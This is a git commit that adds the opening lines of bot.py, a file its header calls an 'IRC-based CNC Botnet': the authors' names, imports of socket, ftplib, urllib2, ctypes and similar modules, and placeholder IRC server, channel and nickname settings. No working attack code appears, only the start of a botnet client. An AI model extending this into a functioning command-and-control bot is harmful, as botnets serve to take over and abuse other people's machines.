886539bb25fd893481b401300ebdda10589356c1
Jackson <samorizu@users.noreply.github.com>
2014-03-07 14:14:53 -0500

    All necessary imports.

--- bot.py
+++ bot.py
@@ -1,1 +1,20 @@
-#THE BOT
+#!/usr/bin/python
+#IRC-based CNC Botnet
+#Luke Matarazzo
+#Jackcson Sadowski
+
+import socket
+import ftplib
+import urllib2
+import urllib
+import sys
+import ctypes
+import random
+import time
+import platform
+import os
+
+#IRC Settings
+server = "server"
+channel = "#cnc"
+botnick = "cncnick"
